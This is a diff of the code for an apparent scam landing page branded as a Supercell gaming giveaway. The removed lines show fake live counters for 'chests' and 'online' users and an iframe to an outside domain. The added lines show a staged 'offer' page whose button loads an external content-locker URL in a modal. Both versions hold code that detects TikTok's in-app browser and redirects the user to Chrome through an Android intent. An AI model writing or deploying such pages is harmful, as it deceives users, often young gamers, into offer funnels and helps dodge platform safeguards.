@@ -242,132 +242,56 @@ opacity:0.7;
 <div class="text">SUPERCELL 2026 • ULTRA GAMING EXPERIENCE</div>
 </div>
 
-<!-- MODAL -->
-<div id="frameModal">
-<button class="closeBtn" onclick="closeFrame()">X</button>
-<iframe id="gameFrame"></iframe>
-</div>
-
 <script>
-const particles=document.getElementById("particles");
-for(let i=0;i<60;i++){
-let s=document.createElement("span");
-s.style.left=Math.random()*100+"vw";
-s.style.animationDuration=(Math.random()*5+5)+"s";
-particles.appendChild(s);
+function openOffer(title,el){
+const img = el.querySelector("img").src;
+
+document.getElementById("loading").style.display="flex";
+
+setTimeout(()=>{
+document.getElementById("loading").style.display="none";
+document.getElementById("grid").style.display="none";
+document.getElementById("offerPage").style.display="block";
+
+document.getElementById("selectedTitle").innerText=title;
+document.getElementById("selectedImage").src=img;
+window.scrollTo({top:0,behavior:"smooth"});
+},900);
 }
 
-let c=0,o=40;
-
-setInterval(()=>{
-if(c<230){
-c+=Math.floor(Math.random()*7)+1;
-document.getElementById("chests").innerText=c;
-}
-},60);
-
-setInterval(()=>{
-o+=(Math.random()<0.5?1:-1);
-o=Math.max(25,Math.min(78,o));
-document.getElementById("online").innerText=o;
-},1200);
-
-let selectedPlatform=null;
-
-function startGame(){
-document.getElementById("step1").style.display="none";
-document.getElementById("step2").style.display="block";
+function go(){
+document.getElementById("lockerModal").style.display="flex";
+document.getElementById("lockerFrame").src="https://authenticateapp.online/cl/i/pqq622";
 }
 
-function selectPlatform(p){
-selectedPlatform=p;
-document.querySelectorAll(".platforms button")
-.forEach(b=>b.classList.remove("active"));
-
-if(p==="Android"){
-document.querySelectorAll(".platforms button")[0].classList.add("active");
-}else{
-document.querySelectorAll(".platforms button")[1].classList.add("active");
-}
+function closeLocker(){
+document.getElementById("lockerModal").style.display="none";
+document.getElementById("lockerFrame").src="";
 }
 
-function openFrame(url){
-document.getElementById("gameFrame").src=url;
-document.getElementById("frameModal").style.display="block";
+function backPage(){
+document.getElementById("offerPage").style.display="none";
+document.getElementById("grid").style.display="grid";
 }
 
-function closeFrame(){
-document.getElementById("gameFrame").src="";
-document.getElementById("frameModal").style.display="none";
+/* TikTok detect + overlay */
+function isTikTok(){
+return /TikTok|musical_ly/i.test(navigator.userAgent);
 }
 
-function easyStep(){
-if(!selectedPlatform){alert("Choose platform first");return;}
-openFrame("https://checkmyapp.store/cl/i/n66xj9");
+function openChrome(){
+const url = window.location.href;
+const intent = "intent://" + url.replace(/^https?:\/\//,'') +
+"#Intent;scheme=https;package=com.android.chrome;end;";
+window.location.href = intent;
+setTimeout(()=>{window.location.href=url},900);
 }
 
-function fastStep(){
-if(!selectedPlatform){alert("Choose platform first");return;}
-openFrame("https://checkmyapp.store/cl/i/n66xj9");
+window.addEventListener("load",()=>{
+if(isTikTok()){
+document.getElementById("ttOverlay").style.display="flex";
 }
-</script>
-<script>
-(function () {
-
-  function isTikTokBrowser() {
-    return /TikTok|musical_ly/i.test(navigator.userAgent);
-  }
-
-  function openInChrome() {
-    const url = window.location.href;
-
-    const intent = "intent://" + url.replace(/^https?:\/\//, "") +
-      "#Intent;scheme=https;package=com.android.chrome;end;";
-
-    // try open Chrome
-    window.location.href = intent;
-
-    // fallback
-    setTimeout(() => {
-      window.location.href = url;
-    }, 900);
-  }
-
-  function showOverlay() {
-    const overlay = document.createElement("div");
-
-    overlay.innerHTML = `
-      <div style="
-        position:fixed;inset:0;z-index:999999;
-        background:#000;display:flex;
-        flex-direction:column;justify-content:center;
-        align-items:center;text-align:center;
-        padding:20px;color:#fff;
-      ">
-        <h2 style="margin-bottom:10px;">Open in Browser</h2>
-        <p style="opacity:.7;margin-bottom:20px;">
-          For best experience open in Chrome / Safari
-        </p>
-        <button onclick="(${openInChrome.toString()})()" 
-          style="
-            padding:12px 18px;
-            border:none;border-radius:10px;
-            background:#3b82f6;color:#fff;
-            font-weight:800;cursor:pointer;
-          ">
-          Open Now
-        </button>
-      </div>
-    `;
-
-    document.body.appendChild(overlay);
-  }
-
-  if (isTikTokBrowser()) {
-    window.addEventListener("load", showOverlay);
-  }
-
-})();
+});
 </script>
 </body>
 </html>
